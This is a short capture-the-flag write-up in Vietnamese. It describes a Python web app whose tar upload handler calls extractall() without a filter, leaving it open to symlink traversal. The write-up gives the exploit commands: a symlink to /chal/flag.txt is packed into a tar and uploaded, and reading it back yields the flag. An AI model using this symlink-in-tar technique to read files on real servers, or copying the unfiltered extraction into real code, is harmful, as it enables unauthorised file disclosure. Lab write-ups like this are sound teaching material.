## Flower Power

Vị trí flag: `/chal/flag.txt`


Trang web python có tính năng upload file và xử lý file `.tar`
```python
@app.post("/api/upload")
@protected_sync
def handle_tar_upload(request: Request):
    tarbytes = io.BytesIO(request.body)
    try:
        with tarfile.open(fileobj=tarbytes, mode="r") as file_upload:
            file_upload.extractall(
                os.path.join("files", request.ctx.user["folder"])
            )
    except tarfile.ReadError as err:
        return json({"error": str(err)}, status=400)
    return json({"success": "files uploaded"})
```

ở đây cho phép upload 1 file `.tar` và lưu nó trên os , Web sử dụng `file_upload.extractall()` để mở extrall nhưng không có tham số `filter='data'` nên nó sẽ không kiểm tra `symlink`. Check version thì `Python 3.11.17` mặc định không bật option này.

Trang web cung cấp 1 tính năng đọc nội dung các file trong `.tar` được upload. 

Khai thác: Đóng gói 1 file `.tar` có symlink trỏ đến `/chal/flag.txt` rồi sau đó mở file
```
# Trỏ đúng tới /chal/flag.txt
ln -s /chal/flag.txt get_flag
tar -cf pay.tar get_flag
tar -tvf pay.tar   # xác nhận: get_flag -> /chal/flag.txt
lrwxrwxrwx ddq/ddq           0 2026-10-04 01:38 get_flag -> /chal/flag.txt

```

upload file và đọc nội dung file `get_flag` để lấy nội dung `dam{what_a_tarrible_app_lol_1249832789427}`


